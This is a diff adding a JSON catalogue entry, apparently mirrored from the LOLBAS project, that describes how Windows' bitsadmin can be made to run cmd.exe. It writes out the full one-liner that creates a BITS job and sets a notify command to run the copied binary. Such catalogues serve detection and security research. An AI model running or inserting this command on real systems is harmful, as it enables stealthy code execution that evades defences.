@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-bitsadmin-exe-execute",
+  "name": "LOLBAS · Bitsadmin.exe (Execute)",
+  "command": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset",
+  "description": "One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "bitsadmin",
+    "execute"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Bitsadmin/",
+  "upstream_id": "Bitsadmin.exe/Execute/0",
+  "category": "lolbas",
+  "subcategory": "execute",
+  "references": [
+    {
+      "title": "LOLBAS — Bitsadmin.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Bitsadmin/"
+    }
+  ]
+}
